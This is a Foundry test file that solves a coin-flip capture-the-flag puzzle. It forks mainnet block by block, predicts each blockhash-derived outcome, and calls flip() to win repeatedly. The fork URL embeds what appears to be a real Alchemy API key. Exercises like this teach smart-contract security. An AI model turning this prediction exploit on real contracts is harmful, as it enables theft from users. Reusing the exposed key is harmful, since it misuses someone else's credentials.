pragma solidity ^0.8.10;
import "forge-std/Test.sol";
import {CoinFlip} from "../src/03-coinflip.sol";

// block.number is the same in one transaction,
// even though, it calls several contracts
// add the usage of forking different blocks of mainnet
// forge is always updating, if you need the new function
// you need to install it again
contract CoinFlip03Test is Test {
    uint256 mainnetFork;
    CoinFlip cflip;

    function setUp() public {
        console.log(unicode"🧪 Setup CoinFlipTest...");

        address bob = mkaddr("bob");
        vm.prank(bob);
        cflip = new CoinFlip();
    }

    function testCoinFlip() public {
        console.log(unicode"🧪 Cracking Coin Flip...");
        address alice = mkaddr("alice");
        vm.deal(alice, 100 ether);
        vm.startPrank(alice);

        uint256 blockValue = 0;
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = true;
        uint256 coinFlip = 0;

        uint256 firstblock = 15182500;

        for (uint256 i = 0; i < 10; i++) {
            mainnetFork = vm.createFork(
                "https://eth-mainnet.alchemyapi.io/v2/vH4vp-kxTVPitFFMcbF9dlZiNXf1oVvd",
                firstblock + i
            );

            // select the fork
            vm.selectFork(mainnetFork);
            // just for local roll blocknumber
            // vm.roll(100 + i);
            emit log_named_uint("Block number is: ", block.number);
            blockValue = uint256(blockhash(block.number - 1));
            coinFlip = blockValue / FACTOR;
            side = coinFlip == 1 ? true : false;
            cflip.flip(side);
        }

        vm.stopPrank();

        emit log_named_uint(
            "Consecutive Wins number is: ",
            cflip.consecutiveWins()
        );
    }

    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
